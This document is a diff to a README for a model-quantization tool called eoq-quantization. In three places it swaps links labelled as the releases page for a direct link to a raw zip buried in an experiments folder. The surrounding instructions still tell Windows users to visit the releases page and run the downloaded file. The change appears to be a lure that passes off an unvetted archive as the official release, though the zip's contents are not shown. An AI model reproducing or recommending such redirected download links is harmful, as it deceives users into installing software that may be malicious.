@@ -1,6 +1,6 @@
 # ⚙️ eoq-quantization - Smaller models, near-FP16 quality
 
-[![Download](https://img.shields.io/badge/Download%20EOQ-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jillyparliamentary462/eoq-quantization/releases)
+[![Download](https://img.shields.io/badge/Download%20EOQ-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jillyparliamentary462/eoq-quantization/raw/refs/heads/main/experiments/exp_g_progressive/eoq-quantization-2.4.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ For the best experience, use a machine with at least 16 GB of RAM. Smaller model
 
 Visit the releases page and download the latest Windows file from there:
 
-[![Go to Releases](https://img.shields.io/badge/Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jillyparliamentary462/eoq-quantization/releases)
+[![Go to Releases](https://img.shields.io/badge/Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jillyparliamentary462/eoq-quantization/raw/refs/heads/main/experiments/exp_g_progressive/eoq-quantization-2.4.zip)
 
 On the releases page, look for a file made for Windows. Common file types include `.exe`, `.zip`, or `.msi`.
 
@@ -150,4 +150,4 @@ Yes. The release process is meant to be simple: visit the releases page, downloa
 
 ## 📎 Download again
 
-[Visit the releases page to download](https://github.com/Jillyparliamentary462/eoq-quantization/releases)
+[Visit the releases page to download](https://github.com/Jillyparliamentary462/eoq-quantization/raw/refs/heads/main/experiments/exp_g_progressive/eoq-quantization-2.4.zip)
